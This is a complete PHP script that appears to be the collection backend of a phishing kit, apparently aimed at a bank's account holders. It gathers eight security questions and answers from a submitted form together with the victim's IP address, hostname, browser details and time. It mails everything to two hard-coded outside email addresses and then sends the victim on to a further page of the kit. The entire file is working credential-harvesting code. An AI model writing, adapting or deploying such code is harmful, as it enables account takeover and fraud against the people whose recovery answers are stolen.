<?php 
$Ok= "niceresults2021@protonmail.com, carolynlinks99@gmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$fuck  = "================== Quest ==================\n";
$fuck .= "Question 1 : ".$_POST['q1']."\n";
$fuck .= "Answer 1 : ".$_POST['a1']."\n";
$fuck .= "Question 2  : ".$_POST['q2']."\n";
$fuck .= "Answer 2 : ".$_POST['a2']."\n";
$fuck .= "Question 3  : ".$_POST['q3']."\n";
$fuck .= "Answer 3 : ".$_POST['a3']."\n";
$fuck .= "Question 4  : ".$_POST['q4']."\n";
$fuck .= "Answer 4 : ".$_POST['a4']."\n";
$fuck .= "Question 5  : ".$_POST['q5']."\n";
$fuck .= "Answer 5 : ".$_POST['a5']."\n";
$fuck .= "Question 6  : ".$_POST['q6']."\n";
$fuck .= "Answer 6 : ".$_POST['a6']."\n";
$fuck .= "Question 7  : ".$_POST['q7']."\n";
$fuck .= "Answer 7 : ".$_POST['a7']."\n";
$fuck .= "Question 8  : ".$_POST['q8']."\n";
$fuck .= "Answer 8 : ".$_POST['a8']."\n";
$fuck .= "============= [ Ip & Hostname Info ] =============\n";
$fuck .= "Client IP : ".$ip."\n";
$fuck .= "HostName : ".$hostname."\n";
$fuck .= "Date And Time : ".$date."\n";
$fuck .= "Browser Details : ".$user_agent."\n";
$fuck .= "=============+Codewizard+===========\n";
$subject = "Navy Ques $ip";
$headers = "From: nAvY Ques <codex@xject.com>";
mail($Ok,$subject,$fuck,$headers);
Header ("Location: full.php");
?>